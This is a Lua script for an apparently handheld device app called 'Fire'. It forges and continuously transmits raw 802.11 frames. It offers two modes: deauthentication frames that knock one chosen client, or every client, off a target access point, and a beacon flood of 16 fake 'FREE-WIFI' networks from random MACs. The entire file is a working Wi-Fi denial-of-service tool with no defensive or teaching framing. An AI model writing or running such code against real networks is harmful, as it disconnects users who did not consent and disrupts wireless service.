-- Fire (ACTIVE, transmits): one tool, several modes, typed targets (no scan needed).
--   deauth : BSSID typed. Client MAC typed = that one station only (both directions);
--            client blank = every station of that AP (broadcast deauth from the AP).
--   flood  : beacon flood of generated SSIDs (see beacon_flood_lua for the same logic on its own).
-- Frames are management deauth (subtype 12, reason 7) or beacons. Runs until Back.
--
-- TARGETING: deauth supports AP-wide and single-client. Beacon flood is broadcast only:
-- MICRO-TARGETING NOT IMPLEMENTED for beacons (no station-addressed beacon exists).

-- keyboard read that treats a cancel (nil) as an empty string
local function txt(...) return input.text(...) or "" end

local BCAST = string.rep("\255", 6)

local function parse_mac(s)
  local h = (s or ""):gsub("[:%-%s]", "")
  if #h ~= 12 or h:find("[^%x]") then return nil end
  return crypto.unhex(h)
end

local function deauth(dst, src, bssid)
  return "\192\0\0\0" .. dst .. src .. bssid .. "\0\0\7\0"
end

local function beacon(ssid, bssid, ch)
  return "\128\0\0\0" .. BCAST .. bssid .. bssid .. "\0\0" .. string.rep("\0", 8) .. "\100\0\1\0"
    .. string.char(0, #ssid) .. ssid .. "\1\4\130\132\139\150\3\1" .. string.char(ch)
end

local function run_frames(ch, build, label)
  local ok, why = wifi.tx_start({ channel = ch })
  if not ok then
    gfx.clear(); gfx.text(14, 60, "could not start: " .. tostring(why), "ui12"); gfx.present()
    while input.wait() ~= "back" do end
    return
  end
  local last_draw = -1000
  local n = 0
  while true do
    local now = system.millis()
    for _, f in ipairs(build()) do wifi.tx(f); n = n + 1 end
    if now - last_draw >= 1000 then
      gfx.clear(); local W, H = gfx.size()
      gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, "Fire (ACTIVE)", "ui12", "bw")
      gfx.text(14, 60, label, "ui12")
      gfx.text(14, 90, "ch " .. ch .. "   sent " .. n, "ui12")
      gfx.text(14, H - 34, "Back = stop", "small")
      gfx.present()
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(50)
  end
  wifi.tx_stop()
end

local ok, err = pcall(function()
  local mode = txt("Mode: deauth or flood", "deauth", 8)
  if mode == "flood" then
    local prefix = txt("SSID prefix", "FREE-WIFI", 24) or "FREE-WIFI"
    local ch = math.tointeger(tonumber(txt("Channel 1-13", "6", 2))) or 6
    local frames = {}
    for i = 1, 16 do
      local b = crypto.random(6)
      frames[i] = beacon(string.format("%s-%02d", prefix, i):sub(1, 32), string.char((b:byte(1) & 0xFE) | 0x02) .. b:sub(2), ch)
    end
    run_frames(ch, function() return frames end, "beacon flood x16")
  else
    local bssid = parse_mac(txt("Target AP BSSID", "", 17))
    if not bssid then error("BSSID must be 12 hex digits") end
    local ch = math.tointeger(tonumber(txt("AP channel 1-13", "6", 2))) or 6
    local client = txt("Client MAC (blank = all clients)", "", 17) or ""
    local sta = parse_mac(client)
    if client ~= "" and not sta then error("client MAC must be 12 hex digits") end
    local label
    local frames
    if sta then
      label = "one client " .. client
      run_frames(ch, function()
        return { deauth(sta, bssid, bssid), deauth(bssid, sta, bssid) }
      end, label)
    else
      run_frames(ch, function() return { deauth(BCAST, bssid, bssid) } end, "all clients of AP")
    end
  end
end)
pcall(function() wifi.tx_stop() end)
if not ok then
  gfx.clear(); gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b"); gfx.present()
  while input.wait() ~= "back" do end
end
app.exit()
